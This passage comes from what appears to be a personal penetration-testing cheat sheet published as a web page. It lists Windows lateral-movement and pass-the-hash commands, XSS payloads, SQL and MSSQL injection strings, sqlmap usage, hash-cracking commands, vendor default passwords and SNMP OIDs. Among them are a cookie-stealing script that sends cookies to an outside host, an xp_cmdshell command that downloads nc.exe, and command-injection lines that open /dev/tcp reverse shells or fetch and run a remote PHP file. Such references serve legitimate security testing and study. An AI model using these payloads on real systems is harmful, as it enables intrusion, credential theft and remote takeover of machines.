<td><code>runas /user:myDomain\administrator cmd</code></td>
<td></td>
</tr>
<tr>
<td><code>runas /user:&lt;domain\user&gt; cmd</code></td>
<td></td>
</tr>
<tr>
<td><code>python3 /usr/share/impacket/wmiexec.py test.local/john:password123@10.10.10.1</code></td>
<td>from linux gain interactive shell on windows machine (needs WMI open)</td>
</tr>
<tr>
<td><code>WMIC /node:target-computer-name process call create “cmd.exe /c task-name”</code></td>
<td></td>
</tr>
<tr>
<td><code>evil-winrm -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’</code></td>
<td>evilwinRM shell from linux</td>
</tr>
<tr>
<td><code>evil-winrm -i 192.168.1.100 -S -k &lt;private key&gt; -c &lt;public key&gt;</code></td>
<td>evilWinRM with private key</td>
</tr>
<tr>
<td><code>psexec \\computer_name -u username -p password cmd.exe</code></td>
<td>Sysinternals command to run remote commands</td>
</tr>
<tr>
<td><code>Get-AdUser -Server &quot;DC.Domain_A.local&quot; -Identity &quot;Name_of_account&quot; -Properties *</code></td>
<td>Get user info of user in separate domain within trust</td>
</tr>
<tr>
<td><code>impacket-addcomputer '&lt;domain&gt;/user:password' -method LDAPS -computer-name &quot;testPC&quot; -computer-pass 'password'</code></td>
<td>Add a computer to a AD domain</td>
</tr>
<tr>
<td><code>Get-ADComputer &lt;computerName&gt;</code></td>
<td>powershell command to grab properties like SID, DNS hostname of a computer in a domain</td>
</tr>
<tr>
<td><code>sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt; /run:cmd.exe</code></td>
<td>mimkatz pass the hash (needs administrator privileges)</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>Checking permissions of the processes binaries</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">for</span> /f <span style="color:#e6db74">&#34;tokens=2 delims=&#39;=&#39;&#34;</span> %<span style="color:#66d9ef">%</span>x <span style="color:#66d9ef">in</span> (<span style="color:#e6db74">&#39;wmic process list full^|find /i &#34;executablepath&#34;^|find /i /v &#34;system32&#34;^|find &#34;:&#34;&#39;</span>) <span style="color:#66d9ef">do</span> (
	<span style="color:#66d9ef">for</span> /f eol^=^<span style="color:#e6db74">&#34;^ delims^=^&#34;</span> %<span style="color:#66d9ef">%</span>z <span style="color:#66d9ef">in</span> (<span style="color:#e6db74">&#39;echo %%x&#39;</span>) <span style="color:#66d9ef">do</span> (
		icacls <span style="color:#e6db74">&#34;%%z&#34;</span> 
2&gt;nul | findstr /i <span style="color:#e6db74">&#34;(F) (M) (W) :\\&#34;</span> | findstr /i <span style="color:#e6db74">&#34;:\\ everyone authenticated users todos %username%&#34;</span> &amp;&amp; echo.
	)
)
</code></pre></div><p>Checking permissions of the folders of the processes binaries</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">for</span> /f <span style="color:#e6db74">&#34;tokens=2 delims=&#39;=&#39;&#34;</span> %<span style="color:#66d9ef">%</span>x <span style="color:#66d9ef">in</span> (<span style="color:#e6db74">&#39;wmic process list full^|find /i &#34;executablepath&#34;^|find /i /v 
</span><span style="color:#e6db74">&#34;system32&#34;^|find &#34;:&#34;&#39;</span>) <span style="color:#66d9ef">do</span> <span style="color:#66d9ef">for</span> /f eol^=^<span style="color:#e6db74">&#34;^ delims^=^&#34;</span> %<span style="color:#66d9ef">%</span>y <span style="color:#66d9ef">in</span> (<span style="color:#e6db74">&#39;echo %%x&#39;</span>) <span style="color:#66d9ef">do</span> (
	icacls <span style="color:#e6db74">&#34;%%~dpy\&#34;</span> 2&gt;nul | findstr /i <span style="color:#e6db74">&#34;(F) (M) (W) :\\&#34;</span> | findstr /i <span style="color:#e6db74">&#34;:\\ everyone authenticated users 
</span><span style="color:#e6db74">todos %username%&#34;</span> &amp;&amp; echo.
)
</code></pre></div><h1 id="webapp">Webapp<a href="#webapp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<h2 id="xss">XSS<a href="#xss" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;script&gt; document.write('&lt;img src=&quot;http://x.x.x.x:8000/?cookie=' + document.cookie + '&quot; /&gt;) &lt;/script&gt;</code></td>
<td>Cookie stealer with script tags</td>
</tr>
<tr>
<td><code>&lt;img src=1 href=1 onerror=&quot;javascript:console.log('XSS Test')&quot;&gt;</code></td>
<td></td>
</tr>
<tr>
<td><code>&lt;img src/onerror=alert(1)&gt;</code></td>
<td></td>
</tr>
<tr>
<td><code>&lt;audio src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/audio&gt;</code></td>
<td></td>
</tr>
<tr>
<td><code>&lt;svg onload=alert(1)&gt;</code></td>
<td></td>
</tr>
<tr>
<td><code>&lt;svg id=x onfocus=alert(1)&gt;</code></td>
<td></td>
</tr>
<tr>
<td><code>&lt;svg width=&quot;400&quot; height=&quot;400&quot;&gt; &lt;image href=&quot;text:/etc/passwd&quot; height=&quot;400&quot; width=&quot;400&quot;/&gt;&lt;/svg&gt;</code></td>
<td>SSRF through PDF generator</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="sql-injection-manually">SQL injection manually<a href="#sql-injection-manually" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>' union select null,null,null,null,null from information_schema.tables;--</code></td>
<td>Enumerate amount of columns</td>
</tr>
<tr>
<td><code>' UNION SELECT NULL,table_name,table_schema,null,null from information_schema.tables;--</code></td>
<td>Grab table names</td>
</tr>
<tr>
<td><code>' UNION SELECT null,column_name,null,null,null from information_schema.columns where table_name='&lt;TableName&gt;';--</code></td>
<td>Grab column names in table</td>
</tr>
<tr>
<td><code>' UNION SELECT null,Username,Password,null,null from &lt;TableName&gt;;--</code></td>
<td>Exfiltrate information</td>
</tr>
</tbody>
</table>
<p><strong>ADD BLIND AND TIME BASED</strong></p>
<h3 id="mssql">MSSQL<a href="#mssql" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>'EXEC xp_cmdshell 'powershell -c Invoke-WebRequest -Uri &quot;http://192.168.22.2:8000/nc.exe&quot; -OutFile &quot;C:\windows\Temp\nc.exe&quot;'; --</code></td>
<td>Command execution with xp_cmdshell (dir, type, ls etc do not work as stdout won&rsquo;t be displayed)</td>
</tr>
<tr>
<td><code>sqlmap -u &quot;htpL//&lt;url&gt;&quot; --os-shell</code></td>
<td>Command execution through sqlmap xp_cmdshell</td>
</tr>
<tr>
<td><code>SELECT @@version</code></td>
<td>DB version</td>
</tr>
<tr>
<td><code>SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='mytable');</code></td>
<td>List columns</td>
</tr>
</tbody>
</table>
<h2 id="oracle-db">Oracle DB<a href="#oracle-db" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<ul>
<li>Port 1521</li>
<li>Oracle use something called the <strong>Transparent Network Substrate (TNS)</strong> for authenticating to their databases. It is a protocol that handles authentication outside of the database.</li>
<li>Oracle used SID values to uniquely identify databases
<ul>
<li>SID values can be bruteforced to discover databases within an Oracle environment (version 9.2.0.7 and below)</li>
<li><code>use auxiliary/scanner/oracle/sid_enum</code></li>
<li><code>use auxiliary/scanner/oracle/sid_brute</code></li>
</ul>
</li>
</ul>
<p><code>nmap -sSV -p1521 -n &lt;IP&gt;</code></p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>SELECT * FROM v$version;*</td>
<td>DB Version</td>
</tr>
<tr>
<td>SELECT instance_name FROM v$instance</td>
<td>Current DB</td>
</tr>
<tr>
<td>SELECT name FROM v$database</td>
<td>Current DB</td>
</tr>
<tr>
<td>SELECT DISTINCT owner FROM all_tables;</td>
<td>List DBs</td>
</tr>
<tr>
<td>SELECT user FROM dual;</td>
<td>current user</td>
</tr>
<tr>
<td>SELECT username FROM all_users ORBERY BY username;</td>
<td>List users</td>
</tr>
<tr>
<td>SELECT column_name FROM all_tab_columns;</td>
<td>List tables</td>
</tr>
<tr>
<td>SELECT name, password, astatus FROM sys.user$;</td>
<td>List password hashes</td>
</tr>
</tbody>
</table>
<h3 id="connect-to-oracle-db">Connect to Oracle DB<a href="#connect-to-oracle-db" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<h4 id="windows-1">Windows<a href="#windows-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<pre tabindex="0"><code>CONNECT username/password@&lt;IP&gt;:&lt;PORT&gt;
</code></pre><h4 id="linux-1">Linux<a href="#linux-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ export ORACLE_HOME<span style="color:#f92672">=</span>/path/to/oracle/home 			<span style="color:#75715e">#usually /usr/lib/oracle/&lt;version&gt;/client64/</span>
$ export LD_LIBRARY_PATH<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$ORACLE_HOME<span style="color:#e6db74">&#34;</span>
$ export PATH<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$ORACLE_HOME<span style="color:#e6db74">:</span>$PATH<span style="color:#e6db74">&#34;</span>
</code></pre></div><p>Local:</p>
<pre tabindex="0"><code>sqlplus sys as sysdba
</code></pre><p>Remote:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlplus username/password@&lt;IP&gt;/&lt;database&gt;
</code></pre></div><h5 id="tns-connectivity">TNS Connectivity<a href="#tns-connectivity" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tnscmd10g

tnscmd10g version -h &lt;IP&gt;
</code></pre></div><h2 id="sqlmap">SQLmap<a href="#sqlmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>sqlmap -u &quot;http://&lt;url&gt;&quot;</code></td>
<td>check its injectable</td>
</tr>
<tr>
<td><code>sqlmap -u &quot;http://&lt;url&gt; --current-db</code></td>
<td>Grab current database</td>
</tr>
<tr>
<td><code>sqlmap -u &quot;http://&lt;url&gt; -D &quot;database&quot; --tables</code></td>
<td>Grab table names for current DB</td>
</tr>
<tr>
<td><code>sqlmap -u &quot;http://&lt;url&gt; -D &quot;database&quot; -T &quot;tableName&quot; --dump</code></td>
<td>Get contents of table</td>
</tr>
</tbody>
</table>
<h2 id="command-injection">Command injection<a href="#command-injection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>SomeFunctionality=NormalInput;id</code></td>
<td></td>
</tr>
<tr>
<td><code>&amp;id</code></td>
<td></td>
</tr>
<tr>
<td><code>&amp;&amp;id</code></td>
<td></td>
</tr>
<tr>
<td><code>id%00</code></td>
<td></td>
</tr>
<tr>
<td>`id`</td>
<td>use backticks</td>
</tr>
<tr>
<td>|<code>ls</code></td>
<td></td>
</tr>
<tr>
<td>||<code>ls</code></td>
<td></td>
</tr>
<tr>
<td><code>$(ls)</code></td>
<td></td>
</tr>
<tr>
<td><code>&gt; /var/www/html/out.txt</code></td>
<td>Not code execution but could be interesting to redirect output</td>
</tr>
<tr>
<td><code>&lt; /etc/passwd</code></td>
<td>Could send input into something</td>
</tr>
<tr>
<td><code>vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php</code></td>
<td></td>
</tr>
<tr>
<td><code>vuln=127.0.0.1; bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</code></td>
<td></td>
</tr>
<tr>
<td><code>vuln=127.0.0.1&amp;&amp; bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</code></td>
<td></td>
</tr>
<tr>
<td><code>vuln=127.0.0.1&amp;&amp;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</code></td>
<td></td>
</tr>
<tr>
<td><code>vuln=127.0.0.1 &amp;&amp; bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</code></td>
<td>Spacing sometimes can make a difference</td>
</tr>
<tr>
<td><code>?cmd={payload}</code></td>
<td></td>
</tr>
<tr>
<td>`time if [ $(whoami</td>
<td>cut -c 1) == s ]; then sleep 5; fi`</td>
</tr>
<tr>
<td><code>system('cat%20/etc/passwd')</code></td>
<td></td>
</tr>
<tr>
<td><code>\n/bin/ls -al\n</code></td>
<td></td>
</tr>
<tr>
<td><code>%0A/usr/bin/id%0A</code></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="directory-enumeration">Directory enumeration<a href="#directory-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ffuf -u http://&lt;IP&gt;/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt</code></td>
<td>Basic enumeration</td>
</tr>
<tr>
<td><code>ffuf -u http://&lt;IP&gt;/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt -fw &lt;number&gt;</code></td>
<td>Filter by words</td>
</tr>
<tr>
<td><code>ffuf -u http://&lt;IP&gt;/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt -fl &lt;number of lines&gt;</code></td>
<td>Filter by number of lines</td>
</tr>
<tr>
<td><code>ffuf -u http://&lt;IP&gt;/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt -fc &lt;response code&gt;</code></td>
<td>Filter out response codes i.e. 404, 403</td>
</tr>
<tr>
<td><code>gobuster dns -d &lt;domain.com&gt; -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</code></td>
<td>Directory enumeration</td>
</tr>
</tbody>
</table>
<h2 id="automated-vuln-scanning">Automated Vuln scanning<a href="#automated-vuln-scanning" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h1 id="password-cracking">Password cracking<a href="#password-cracking" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<h2 id="hashcat">Hashcat<a href="#hashcat" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -m <span style="color:#ae81ff">18200</span> --force -a <span style="color:#ae81ff">0</span> hashes.asreproast passwords_kerb.txt 
</code></pre></div><h2 id="john">John<a href="#john" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john --wordlist<span style="color:#f92672">=</span>passwords_kerb.txt hashes.asreproast
john hashList.txt
john --show hashList.txt <span style="color:#75715e"># show password once hash has been cracked</span>
</code></pre></div><h2 id="default-credentials">Default credentials<a href="#default-credentials" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<table>
<thead>
<tr>
<th>Vendor</th>
<th>Username</th>
<th>Passwords</th>
</tr>
</thead>
<tbody>
<tr>
<td>APC</td>
<td>apc, device</td>
<td>apc</td>
</tr>
<tr>
<td>Brocade</td>
<td>admin</td>
<td>admin123, password, brocade, fibranne</td>
</tr>
<tr>
<td>Cisco</td>
<td>admin, cisco, enable, hsa, pnadmin, ripeop, root, shelladmin</td>
<td>admin, Admin123, default, password, secur4u, cisco, Cisco, _Cisco, cisco123, C1sco!123_, Cisco123, Cisco1234, TANDBERG, change_it, 12345, ipics, pnadmin, diamond, hsadb, c, cc, attack, blender, changeme</td>
</tr>
<tr>
<td>Citrix</td>
<td>root, nsroot, nsaint, vdiadmin, kvm, cli, admin</td>
<td>Citrix321, nsroot, nsmaint, kaviza, kaviza123, freebsd, public, rootadmin, wanscaler</td>
</tr>
<tr>
<td>D-Link</td>
<td>admin, user</td>
<td>private, admin, user</td>
</tr>
<tr>
<td>Dell</td>
<td>root, user1, admin, vkernel, cli</td>
<td>calvin, 123456, password, vkernel, Stor@age!, admin</td>
</tr>
<tr>
<td>EMC</td>
<td>admin, root, sysadmin</td>
<td>EMCPAdm7n, Password#1, Password123#, sysadmin, changeme, emc</td>
</tr>
<tr>
<td>HP/3Com</td>
<td>admin, root, vcx, app, spvar, manage, hpsupport, opc_op</td>
<td>admin, password, hpinvent, iMC123, pvadmin, passw0rd, besgroup, vcx, nice, access, config, 3V@rpar, 3V#rpar, procurve, badg3r5, OpC_op, !manage, !admin</td>
</tr>
<tr>
<td>Huawei</td>
<td>admin, root</td>
<td>123456, admin, root, Admin123, Admin@storage, Huawei12#$, HwDec@01, hwosta2.0, HuaWei123, fsp200@HW, huawei123</td>
</tr>
<tr>
<td>IBM</td>
<td>USERID, admin, manager, mqm, db2inst1, db2fenc1, dbusr1, db2admin, iadmin, system, device, ufmcli, customer</td>
<td>PASSWORD, passw0rd, admin, password, Passw8rd, iadmin, apc, 123456, cust0mer</td>
</tr>
<tr>
<td>Juniper</td>
<td>netscreen</td>
<td>netscreen</td>
</tr>
<tr>
<td>NetApp</td>
<td>admin</td>
<td>netapp123</td>
</tr>
<tr>
<td>Oracle</td>
<td>root, oracle, oravis, applvis, ilom-admin, ilom-operator, nm2user</td>
<td>changme, ilom-admin, ilom-operator, welcome1, oracle</td>
</tr>
<tr>
<td>VMware</td>
<td>vi-admin, root, hqadmin, vmware, admin</td>
<td>vmware, vmw@re, hqadmin, default</td>
</tr>
</tbody>
</table>
<h1 id="snmp-oid-values">SNMP OID values<a href="#snmp-oid-values" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<table>
<thead>
<tr>
<th>OID</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>.1.3.6.1.2.1.1.5</td>
<td>Hostname</td>
</tr>
<tr>
<td>.1.3.6.1.4.1.77.4.2</td>
<td>Domain name</td>
</tr>
<tr>
<td>.1.3.6.1.4.1.77.1.2.25</td>
<td>Usernames</td>
</tr>
<tr>
<td>.1.3.6.1.4.1.77.1.2.3.1.1</td>
<td>Running services</td>
</tr>
<tr>
<td>.1.3.6.1.4.77.1.2.27</td>
<td>Share information</td>
</tr>
</tbody>
</table>

      </div></div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>





  
</div>

</body>
</html>
